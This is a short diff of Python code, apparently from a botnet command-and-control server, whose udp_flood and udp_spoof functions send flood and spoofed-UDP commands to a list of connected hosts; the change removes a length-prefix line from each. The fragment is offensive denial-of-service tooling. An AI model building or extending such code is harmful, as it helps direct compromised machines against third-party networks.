@@ -25,7 +25,6 @@ def udp_flood(server, args):
         for host in hosts:
             try:
                 host.send(host.command_dict['udpFlood'])
-                host.send("%03d" % len(cmd))
                 host.send(cmd)
             except sock_error:
                 host.purge()
@@ -54,7 +53,6 @@ def udp_spoof(server, args):
         for host in hosts:
             try:
                 host.send(host.command_dict['udpSpoof'])
-                host.send("%03d" % len(cmd))
                 host.send(cmd)
             except sock_error:
                 host.purge()
